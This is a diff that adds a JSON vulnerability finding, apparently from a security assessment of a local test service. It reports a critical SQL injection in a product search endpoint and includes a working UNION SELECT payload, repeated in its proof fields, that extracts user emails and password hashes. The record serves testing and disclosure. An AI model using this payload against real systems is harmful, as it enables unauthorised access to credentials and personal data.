@@ -1,0 +1,28 @@
+{
+  "id": "f_1784838100522_06e350",
+  "action": "confirm",
+  "title": "SQL Injection in Product Search",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "/rest/products/search",
+  "url": "/rest/products/search",
+  "description": "The product search endpoint at /rest/products/search is vulnerable to SQL injection via the 'q' parameter. The search parameter is unsafely concatenated into a SQL query, allowing an attacker to alter the query structure. This enables extraction of arbitrary data from the database, including user credentials, credit card information, and other sensitive data stored in the backend SQLite database.",
+  "poc": "GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- → HTTP 200 with JSON response containing all user emails and password hashes",
+  "proof": "GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- returns HTTP 200 with JSON array containing user emails and bcrypt password hashes in the products data. Proves UNION-based extraction from Users table.",
+  "how_captured": "script: result.json",
+  "evidence_ids": [
+    "ev_1784838100514_9278d1"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784838100514_9278d1",
+      "excerpt": "GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- returns HTTP 200 with JSON array containing user emails and bcrypt password hashes in the products data. Proves UNION-based extraction from Users table.",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "script: result.json"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-23T20:21:40.522Z"
+}
